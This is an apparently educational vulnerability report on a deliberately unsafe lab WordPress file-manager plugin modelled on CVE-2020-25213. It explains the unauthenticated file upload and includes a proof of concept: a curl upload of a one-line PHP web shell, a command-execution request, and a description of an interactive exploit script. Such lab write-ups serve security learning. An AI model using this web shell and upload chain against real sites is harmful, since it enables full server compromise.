# Vulnerability Report

## WP-File-Manager-Unsafe Remote Code Execution

### By: Jan Adrie Carandang

## Summary

A critical Remote Code Execution (RCE) vulnerability was identified in the custom lab plugin **wp-file-manager-unsafe**, deployed inside the **wp-vuln** Docker‑based WordPress environment.  
Although this lab uses a custom minimal plugin, the vulnerability design is directly inspired by **CVE‑2020‑25213**, a real‑world critical WordPress File Manager plugin vulnerability that allowed unauthenticated arbitrary file upload and full server compromise.

This report evaluates the custom vulnerable plugin while referencing the behavior and security impact observed in CVE‑2020‑25213.

----------
# Technical Details

The vulnerable upload endpoint (`Adrie-file-manager.php`) receives a file through a POST request and writes it directly to the plugin directory:
`/wp-content/plugins/wp-file-manager-unsafe/`
The handler lacks the following protections:
-   No authentication or session checks 
-   No file extension or MIME type validation 
-   No sanitization of filenames
-   No restrictions on executable file types
-   No upload directory isolation
-   No server-side filtering or verification

This allows an attacker to upload any PHP file and execute it remotely.

The flow is:
-   Send a `multipart/form-data` POST request.
-   Plugin saves the file.
-   File becomes accessible under the plugins/wp-file-manager-unsafe/uploads folder.
-   Attacker executes arbitrary commands through the uploaded PHP file.   
-   Server compromise occurs.

## Affected Endpoint

`http://<target>/wp-content/plugins/wp-file-manager-unsafe/Adrie-file-manager.php`
**Function:**  
Handles file uploads with: `move_uploaded_file($_FILES['file']['tmp_name'], $upload_path . '/' . $_FILES['file']['name']);`

This PHP file handles file uploads via POST and has no validation, no authentication, no sanitization. Uploaded files are stored in:
`/wp-content/plugins/wp-file-manager-unsafe/uploads/`

----------
## Severity

**Critical** – Remote code execution leading to full container compromise.
## CVSS Scores

| Scoring Authority | Base Score | Severity | CVSS Vector |
|------------------|-----------|---------|------------|
| NIST (NVD)        | 9.8       | CRITICAL | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| MITRE             | 10.0      | CRITICAL | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |


## Vulnerability Description

The plugin’s file upload handling has the following issues:
1.  No authentication or user verification
2.  No file extension or MIME type validation
3.  Saves files directly into a web-accessible directory 
4.  Uploaded PHP files are executable   
5.  Default permissions may require adjustment inside Docker to allow uploads
    
Uploaded PHP file example:
`
http://<target>/wp-content/plugins/wp-file-manager-unsafe/uploads/shell.php
`
Visiting this URL executes arbitrary system commands as the web server user (`www-data`).

## Proof of Concept (PoC)

### 1. Upload a PHP payload
`curl -X POST -F "file=@payload.php" \
  http://localhost:9999/wp-content/plugins/wp-file-manager-unsafe/Adrie-file-manager.php`
  
Where `payload.php` contains:
`<?php echo shell_exec($_GET['cmd']); ?>`

![](https://cdn.discordapp.com/attachments/484372324896866314/1441711269068673075/CB2DB554-6070-4046-BA6B-33F9EBC8D81F.png?ex=6922c9c0&is=69217840&hm=7ec14d8f3901e08fec53703bb79cbdb3b636e35309f58636d2928338dcaeb773)

### 2. Execute system commands via the uploaded shell
`curl "http://localhost:9999/wp-content/plugins/wp-file-manager-unsafe/uploads/payload.php?cmd=id"`
Example output:
![cmd=id result](https://cdn.discordapp.com/attachments/484372324896866314/1441717268294799483/07AC2DB6-28E4-43C5-98E7-85B211334ADF.png?ex=6922cf56&is=69217dd6&hm=a77f461a35481340ee6c8f2545b62f2542ee96aa8dc7d5523ecbc15c26a5a33f)
This confirms code execution as the web server user.

## Exploit Script Explanation (`scirpt.py`)

The exploit script automates the entire attack chain.  
Below is the high-level explanation.

### 1. Upload PHP Shell
The script uses Python `requests` to POST:
`/wp-content/plugins/wp-file-manager-unsafe/Adrie-file-manager.php`

 It sends a user-supplied file:
`files = {'file': open(args.file, 'rb')}`

 If successful, the script prints:
`[+] File uploaded successfully`
### 2. Build Shell URL
The script auto constructs:
`TARGET/wp-content/plugins/wp-file-manager-unsafe/uploads/<filename>`

Then prints:
`[+] Shell URL: http://TARGET/.../uploads/payload.php
`

### 3. Interactive RCE Mode
The script provides a simple command loop:
`shell? id`
`shell? whoami`
`shell? uname -a`

Each command is sent as:
`?cmd=<COMMAND>`
#### Example of running `script.py` and interacting with a shell.
![enter image description here](https://cdn.discordapp.com/attachments/484372324896866314/1441724358577094768/D2F120D9-22FC-4CED-9928-AC920FF8C907.png?ex=6922d5f1&is=69218471&hm=6b19388beb4b90ce9dc2260a96ab675b4fdab5fcc476dc2e3a028c5a44d749df)


